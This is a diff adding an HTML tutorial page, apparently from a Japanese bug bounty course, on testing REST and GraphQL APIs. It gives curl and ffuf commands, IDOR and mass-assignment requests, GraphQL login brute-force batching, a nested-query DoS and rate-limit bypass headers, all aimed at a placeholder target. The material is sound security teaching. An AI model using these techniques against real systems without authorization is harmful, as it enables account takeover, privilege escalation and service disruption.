@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API Security Testing - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn {
+            display: inline-block;
+            padding: 0.5rem 1.2rem;
+            border: 1px solid var(--green);
+            border-radius: 6px;
+            background: transparent;
+            color: var(--green);
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+        }
+        .complete-btn:hover { background: var(--green); color: #000; }
+        .complete-btn.is-complete { background: var(--green); color: #000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 3: Recon &amp; Blackbox &gt; API Security Testing
+        </div>
+
+        <div class="page-header">
+            <h1>API Security Testing</h1>
+            <p class="subtitle">
+                REST, GraphQL, gRPC -- API は現代 Web の心臓部。認可不備、情報漏洩、ロジック欠陥の宝庫。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-practice">Practice</span>
+            </div>
+        </div>
+
+        <!-- Section: REST API Testing -->
+        <div class="section">
+            <h2>REST API Testing</h2>
+
+            <h3>Endpoint Enumeration</h3>
+            <p>API の全 endpoint を把握することが最初のステップ。</p>
+<pre><code># Swagger/OpenAPI spec の探索
+curl https://target.com/swagger.json
+curl https://target.com/api/swagger.json
+curl https://target.com/v1/api-docs
+curl https://target.com/openapi.json
+curl https://target.com/.well-known/openapi.yaml
+
+# ffuf で API path brute force
+ffuf -u https://target.com/api/FUZZ -w api-wordlist.txt
+ffuf -u https://target.com/api/v1/FUZZ -w api-wordlist.txt</code></pre>
+
+            <h3>HTTP Method Testing</h3>
+            <p>GET しかドキュメント化されていない endpoint に PUT/DELETE/PATCH を送る。</p>
+<pre><code># 全メソッドを試す
+for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
+  echo "=== $method ==="
+  curl -s -o /dev/null -w "%{http_code}" -X $method \
+    https://target.com/api/v1/users/123
+done
+
+# OPTIONS で許可メソッドを確認
+curl -X OPTIONS https://target.com/api/v1/users -i
+# Allow: GET, POST, PUT, DELETE</code></pre>
+
+            <h3>Parameter Tampering</h3>
+<pre><code># IDOR: 自分の ID を他人の ID に変更
+GET /api/v1/users/MY_ID/documents  → 200
+GET /api/v1/users/OTHER_ID/documents  → 200 (IDOR!)
+
+# 権限昇格: role パラメータの追加
+POST /api/v1/register
+{"username":"test","email":"test@test.com","role":"admin"}
+
+# Hidden parameter: フロントが送らないパラメータを追加
+PUT /api/v1/profile
+{"name":"test","is_verified":true,"is_admin":true}</code></pre>
+
+            <h3>Mass Assignment</h3>
+            <p>
+                API が受け取るパラメータを制限していない場合、
+                意図しないフィールドを書き換えられる。
+            </p>
+<pre><code># 通常のプロフィール更新
+PUT /api/profile {"name":"new name"}
+
+# Mass Assignment 試行
+PUT /api/profile {"name":"new name","role":"admin","balance":99999}
+
+# 発見方法: レスポンスに含まれるが送信していないフィールドを列挙
+# そのフィールドを送信時に含めてみる</code></pre>
+        </div>
+
+        <!-- Section: GraphQL -->
+        <div class="section">
+            <h2>GraphQL Security Testing</h2>
+
+            <h3>Introspection Query</h3>
+            <p>GraphQL のスキーマ全体を取得する最初のステップ。本番で無効化されていないことが多い。</p>
+<pre><code># Full introspection
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
+
+# Query/Mutation 一覧取得
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"}'</code></pre>
+
+            <h3>Field Suggestion (Introspection 無効時)</h3>
+<pre><code># 存在しないフィールドを送ると候補が返ることがある
+{"query":"{ usr }"}
+# → "Did you mean 'user'?"
+
+# clairvoyance - 自動で field suggestion からスキーマ復元
+python3 clairvoyance.py https://target.com/graphql</code></pre>
+
+            <h3>Authorization Per-Field</h3>
+<pre><code># 一般ユーザーで admin-only フィールドにアクセス
+{
+  user(id: "123") {
+    name
+    email
+    ssn           # admin-only field?
+    creditCard    # admin-only field?
+    internalNotes # admin-only field?
+  }
+}</code></pre>
+
+            <h3>Batching Attacks</h3>
+<pre><code># 同一リクエストで複数クエリ (rate limit bypass)
+[
+  {"query":"mutation { login(email:\"a@b.com\",pass:\"0000\") { token } }"},
+  {"query":"mutation { login(email:\"a@b.com\",pass:\"0001\") { token } }"},
+  {"query":"mutation { login(email:\"a@b.com\",pass:\"0002\") { token } }"}
+]
+
+# Alias を使った batching
+{
+  a0: login(email:"a@b.com", pass:"0000") { token }
+  a1: login(email:"a@b.com", pass:"0001") { token }
+  a2: login(email:"a@b.com", pass:"0002") { token }
+}</code></pre>
+
+            <h3>Nested Query DoS</h3>
+<pre><code># 深くネストされたクエリでサーバーリソースを消費
+{
+  user(id:"1") {
+    friends {
+      friends {
+        friends {
+          friends { name }
+        }
+      }
+    }
+  }
+}</code></pre>
+
+            <div class="callout warning">
+                <div class="callout-title">BB視点: GraphQL IDOR の実例</div>
+                <p>
+                    HackerOne で高額報酬を得た多くの report は GraphQL の認可不備。
+                    node(id: "ENCODED_ID") パターンで他ユーザーのオブジェクトにアクセスするケースが典型。
+                    ID は Base64 decode すると "User:12345" のような形式が多い。
+                </p>
+            </div>
+        </div>
+
+        <!-- Section: API Versioning -->
+        <div class="section">
+            <h2>API Versioning Bypass</h2>
+            <p>
+                新しいバージョンで修正された脆弱性が古いバージョンに残っていることがある。
+            </p>
+<pre><code># バージョンパスの探索
+/api/v1/users    # 現行バージョン
+/api/v2/users    # 新バージョン (機能制限あり?)
+/api/v0/users    # 旧バージョン (認証なし?)
+/api/internal/users  # 内部用 (認証なし?)
+/api/beta/users  # ベータ版
+/api/legacy/users
+
+# ヘッダーでバージョン指定
+curl -H "Api-Version: 1.0" https://target.com/api/users
+curl -H "X-API-Version: 2021-01-01" https://target.com/api/users
+curl -H "Accept: application/vnd.target.v1+json" https://target.com/api/users</code></pre>
+        </div>
+
+        <!-- Section: Rate Limiting -->
+        <div class="section">
+            <h2>Rate Limiting Bypass</h2>
+<pre><code># IP rotation headers
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 5.6.7.8
+X-Originating-IP: 9.10.11.12
+
+# Case variation
+POST /api/login
+POST /Api/Login
+POST /API/LOGIN
+
+# Path manipulation
+POST /api/login
+POST /api/./login
+POST /api/login/
+POST /api//login
+
+# HTTP method change (if both work)
+POST /api/login → PUT /api/login
+
+# Parameter pollution
+POST /api/login?param=1
+POST /api/login?param=2</code></pre>
+        </div>
+
+        <!-- Section: Swagger Analysis -->
+        <div class="section">
+            <h2>Swagger/OpenAPI Spec Analysis</h2>
+            <p>
+                Swagger spec が見つかった場合、ドキュメント化された endpoint と実際の endpoint を比較する。
+                undocumented endpoint は認証が甘い傾向にある。
+            </p>
+<pre><code># Swagger spec から全 endpoint 抽出
+cat swagger.json | jq '.paths | keys[]'
+
+# bearerAuth が定義されているのに実際は認証なしの endpoint を探す
+# → spec と実装の乖離 = vulnerability
+
+# Swagger UI が公開されている場合
+# https://target.com/swagger-ui/
+# "Try it out" で直接 API を叩ける</code></pre>
+        </div>
+
+        <!-- Section: Key Takeaways -->
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>Introspection は最初に試す</strong> — GraphQL のスキーマが全て見える可能性</li>
+                    <li><strong>古いバージョンを狙う</strong> — v1 に認証バイパスが残っていることがある</li>
+                    <li><strong>レスポンスフィールドを全て読む</strong> — 送っていないフィールドが返る = Mass Assignment 候補</li>
+                    <li><strong>Batching は Rate Limit の天敵</strong> — GraphQL の alias/array batching</li>
+                    <li><strong>Swagger は攻撃者の味方</strong> — 開発者向けドキュメントが攻撃の地図になる</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section: References -->
+        <div class="section">
+            <h2>References</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/graphql" target="_blank">PortSwigger: GraphQL API vulnerabilities</a></li>
+                <li><a href="https://github.com/nikitastupin/clairvoyance" target="_blank">clairvoyance - GraphQL schema recovery</a></li>
+                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html" target="_blank">OWASP REST Security Cheat Sheet</a></li>
+                <li><a href="https://owasp.org/API-Security/editions/2023/en/0x11-t10/" target="_blank">OWASP API Security Top 10</a></li>
+                <li><a href="https://graphql.org/learn/introspection/" target="_blank">GraphQL Introspection</a></li>
+            </ul>
+        </div>
+
+        <!-- Complete button -->
+        <div style="text-align:center; margin: 2rem 0;">
+            <button class="complete-btn" data-module-id="33-api" onclick="toggleComplete('33-api')">Mark Complete</button>
+        </div>
+
+        <!-- Navigation -->
+        <div class="page-nav">
+            <a href="32-js-analysis.html">&larr; 前: JavaScript Analysis</a>
+            <a href="34-mobile-api.html">次: Mobile API Testing &rarr;</a>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
